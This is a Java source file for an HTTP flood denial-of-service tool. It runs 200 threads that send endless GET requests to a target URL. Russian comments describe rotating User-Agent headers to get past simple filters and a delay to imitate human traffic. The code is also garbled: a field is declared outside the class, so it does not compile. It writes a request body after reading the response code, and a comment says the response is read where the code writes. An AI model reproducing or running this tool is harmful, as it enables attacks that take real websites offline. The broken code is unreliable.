import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

    private static final int THREADS = 200;
    public class HttpFlood {
    private static final int THREADS = 200;
    private static final String[] USER_AGENTS = {
        "Mozilla/5.0", "Chrome/91.0", "Safari/14.0", "Edge/91.0"
    };
    
    public static void main(String[] args) {
        if(args.length < 1) {
            System.out.println("Usage: java HttpFlood     <target URL>");
            return;
        }
        
        String targetUrl = args[0];
        ExecutorService executor = Executors.newFixedThreadPool(THREADS);
        
        System.out.println("Starting HTTP flood attack on " + targetUrl);
        
        for(int i = 0; i < THREADS; i++) {
            executor.execute(new AttackTask(targetUrl));
        }
    }
    
    static class AttackTask implements Runnable {
        private final String targetUrl;
        
        AttackTask(String targetUrl) {
            this.targetUrl = targetUrl;
        }
        
        @Override
        public void run() {
            while(true) {
                try {
                    URL url = new URL(targetUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    
                    // Случайные заголовки для обхода простых фильтров
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("User-Agent", USER_AGENTS[(int)(Math.random() * USER_AGENTS.length)]);
                    conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
                    conn.setRequestProperty("Connection", "keep-alive");
                    
                    // Отправка запроса
                    conn.connect();
                    int responseCode = conn.getResponseCode();
                    System.out.println("Response code: " + responseCode);
                    
                    // Чтение ответа для увеличения нагрузки
                    try(OutputStream os = conn.getOutputStream()) {
                        os.write("dummy=data".getBytes());
                    }
                    
                    conn.disconnect();
                    Thread.sleep(50); // Задержка для имитации "человеческого" поведения
                } catch(IOException | InterruptedException e) {
                    System.err.println("Error in thread: " + e.getMessage());
                }
            }
        }
    }
}